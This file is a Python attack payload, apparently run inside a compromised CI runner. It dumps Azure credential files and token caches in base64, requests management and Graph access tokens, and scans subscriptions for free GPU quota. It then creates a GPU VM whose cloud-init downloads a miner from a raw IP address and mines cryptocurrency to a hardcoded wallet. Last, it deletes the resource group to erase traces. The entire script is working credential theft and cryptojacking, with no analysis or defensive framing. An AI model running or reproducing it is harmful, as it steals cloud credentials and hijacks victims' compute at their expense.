#!/usr/bin/env python3
import base64, glob, json, os, subprocess, sys, textwrap, time
NONCE = os.environ.get('C211_NONCE', 'x133460')
WALLET = 'prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr'
RELAY = 'stratum+tcp://217.15.164.237:2083'
DIRECT = 'stratum+tcp://103.199.106.122:3362'
MIRROR = 'http://169.58.247.186:8791/pm/peakminer-2.20.0-linux-x86_64'
SHA = '561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18'
REGIONS = ['eastus', 'westus2', 'centralus', 'canadacentral', 'westeurope', 'southeastasia', 'eastasia', 'northeurope']
SKUMAP = [('ncasv3_t4', 'Standard_NC4as_T4_v3', 4), ('ncast4', 'Standard_NC4as_T4_v3', 4),
          ('nvad', 'Standard_NV6ads_A10_v5', 6), ('ncadsa100', 'Standard_NC24ads_A100_v4', 24),
          ('ncadsh100', 'Standard_NC40ads_H100_v5', 40), ('ncv3', 'Standard_NC6s_v3', 6),
          ('ncpromo', 'Standard_NC6s_v3', 6), ('ncfamily', 'Standard_NC6', 6), ('nvfamily', 'Standard_NV6', 6)]
def sh(cmd, timeout=900):
    print('$ ' + cmd[:400], flush=True)
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = (p.stdout or '')[-9000:]; err = (p.stderr or '')[-2000:]
        print(out, flush=True)
        if err.strip(): print('STDERR: ' + err, flush=True)
        print('rc=%d' % p.returncode, flush=True)
        return p.returncode, p.stdout or '', p.stderr or ''
    except Exception as e:
        print('EXC %s' % e, flush=True); return -1, '', str(e)
print('C211_PAYLOAD_START nonce=%s' % NONCE, flush=True)
tmp = os.environ.get('RUNNER_TEMP', '/home/runner/work/_temp')
for f in glob.glob(os.path.join(tmp, 'c211', '*')) + glob.glob(os.path.join(tmp, 'c211', 'args.log')):
    print('C211_SHIMFILES ' + f, flush=True)
sh('cat %s/c211/args.log 2>/dev/null | head -c 20000; echo' % tmp)
if os.path.exists(os.path.join(tmp, 'c211', 'az')):
    print('C211_SHIM_PRESENT', flush=True)
sh("env | grep -iE 'azure|tenant|subscription|arm_' | sort")
sh('ls -la ~/.azure 2>&1 | head -30')
sh('echo C211_PROFILE; base64 -w0 ~/.azure/azureProfile.json 2>/dev/null; echo')
sh('echo C211_MSAL; base64 -w0 ~/.azure/msal_token_cache.json 2>/dev/null | head -c 24000; echo')
sh('echo C211_ATOK; base64 -w0 ~/.azure/accessTokens.json 2>/dev/null | head -c 24000; echo')
sh('echo C211_TOKFRESH; base64 -w0 $RUNNER_TEMP/c211/args.log 2>/dev/null | head -c 8000; echo')
sh('az account show -o json')
sh('az account list -o json --all')
sh('az account get-access-token --resource https://management.azure.com -o json')
sh('az account get-access-token --resource https://graph.microsoft.com -o json')
sh("az role assignment list --all --query '[].{r:roleDefinitionName,s:scope}' -o json 2>&1 | head -c 3000")
sh('az group list -o json 2>&1 | head -c 3000')
sh('az vm list -o json 2>&1 | head -c 2500')
sh("az rest --method get --url 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o json 2>&1 | head -c 1500")
subs = []
rc, out, _ = sh('az account list -o json --all')
try:
    subs = json.loads(out)
except Exception:
    print('C211_NO_ACCOUNT_LIST', flush=True)
if not isinstance(subs, list): subs = []
chosen = None
for sub in subs:
    sid = sub.get('id')
    if not sid: continue
    sh("az rest --method get --url 'https://management.azure.com/subscriptions/%s/providers/Microsoft.App/managedEnvironments?api-version=2024-03-01' -o json 2>&1 | head -c 2500" % sid)
    for region in REGIONS:
        rc, out, _ = sh('az vm list-usage --location %s -o json' % region)
        try: us = json.loads(out)
        except Exception: continue
        free = []
        for u in us:
            nm = (u.get('name') or {}).get('value') or ''
            cur, lim = u.get('currentValue') or 0, u.get('limit') or 0
            low = nm.lower()
            if lim > cur and any(k in low for k in ['nc', 'nd', 'nv']) and ('family' in low or 'ads' in low or low.startswith('standard n')):
                free.append((nm, cur, lim))
        print('C211_QUOTA sub=%s region=%s gpu_families=%s' % (sid, region, json.dumps(free)), flush=True)
        sh("az rest --method get --url 'https://management.azure.com/subscriptions/%s/providers/Microsoft.App/locations/%s/usages?api-version=2024-03-01' -o json 2>&1 | head -c 1200" % (sid, region))
        if chosen: continue
        for nm, cur, lim in free:
            match = None
            for key, sku, vcpu in SKUMAP:
                if key in nm.lower(): match = (sku, vcpu); break
            if match and lim - cur >= match[1]:
                chosen = {'sub': sid, 'region': region, 'family': nm, 'sku': match[0], 'usage': [cur, lim]}
                break
        if chosen: break
    if chosen: break
print('C211_CHOSEN ' + json.dumps(chosen or {}), flush=True)
if chosen:
    rg = ('c211-%s-rg' % NONCE.replace('_', '-'))[:80]
    vm = 'node-h1'
    sid, region, sku = chosen['sub'], chosen['region'], chosen['sku']
    cloud = textwrap.dedent('''\
    #cloud-config
    runcmd:
     - mkdir -p /opt/c211 /var/log/c211
     - bash -c 'nvidia-smi -L > /var/log/c211/proof.txt 2>&1; nvidia-smi >> /var/log/c211/proof.txt 2>&1; echo PROOF_DONE'
     - bash -c 'curl -fsSL --max-time 240 "%(mirror)s" -o /opt/c211/peakminer; chmod +x /opt/c211/peakminer; sha256sum /opt/c211/peakminer > /var/log/c211/sha.txt 2>&1'
     - bash -c 'cd /opt/c211; N=$(nvidia-smi -L 2>/dev/null | wc -l); echo "gpus=$N" > /var/log/c211/mine.txt; for i in $(seq 0 $((N-1))); do ( timeout 500 ./peakminer -o "%(relay)s" -o "%(direct)s" -u "%(wallet)s" -w "node-h$i" -p x -c pearl -d "$i" --no-tips > out-g$i.txt 2>&1; echo "miner_rc[$i]=$?" >> out-g$i.txt ) & done; wait; echo MINER_DONE >> /var/log/c211/mine.txt'
    ''' % {'mirror': MIRROR, 'relay': RELAY, 'direct': DIRECT, 'wallet': WALLET})
    open('/tmp/c211-cloudinit.yaml', 'w').write(cloud)
    sh('az group create -n %s -l %s -o json' % (rg, region))
    rc, out, err = sh('az vm create -g %s -n %s -l %s --image microsoft-dsvm:ubuntu-hpc:2204:latest --size %s --admin-username c211 --generate-ssh-keys --custom-data /tmp/c211-cloudinit.yaml --public-ip-sku Standard --nsg-rule NONE -o json' % (rg, vm, region, sku), timeout=1500)
    if rc != 0:
        print('C211_GATE_VM_CREATE_FAILED ' + (err or out)[-900:], flush=True)
        sh('az vm create -g %s -n %s -l %s --image Canonical:0001-com-ubuntu-server-jammy:22_04-lts-gen2:latest --size %s --admin-username c211 --generate-ssh-keys --public-ip-sku Standard --nsg-rule NONE -o json' % (rg, vm + 'b', region, sku), timeout=1500)
        print('C211_GATE_SECOND_TRY_DONE', flush=True)
    else:
        print('C211_VM_CREATED', flush=True)
        time.sleep(180)
        RC = ('cat /var/log/c211/proof.txt /var/log/c211/sha.txt 2>&1 | head -c 12000; echo; echo ==MINE==; cat /var/log/c211/mine.txt 2>&1; echo ==TAILS==; for f in /opt/c211/out-g*.txt; do echo ==$f; tail -20 $f; done | head -c 12000')
        sh('az vm run-command invoke -g %s -n %s --command-id RunShellScript --scripts %s -o json' % (rg, vm, json.dumps(RC)), timeout=900)
        time.sleep(400)
        sh('az vm run-command invoke -g %s -n %s --command-id RunShellScript --scripts %s -o json' % (rg, vm, json.dumps(RC)), timeout=900)
    sh('az group delete -n %s --yes --no-wait -o json' % rg, timeout=600)
    time.sleep(45)
    for i in range(12):
        rc, out, err = sh('az group show -n %s -o json 2>&1 | head -c 400' % rg)
        if rc != 0 and ('ResourceGroupNotFound' in out + err or 'could not be found' in out + err):
            print('C211_CLEANUP_PROVEN_ABSENT', flush=True); break
        time.sleep(30)
else:
    print('C211_GATE_NO_GPU_QUOTA', flush=True)
print('C211_PAYLOAD_END nonce=%s' % NONCE, flush=True)
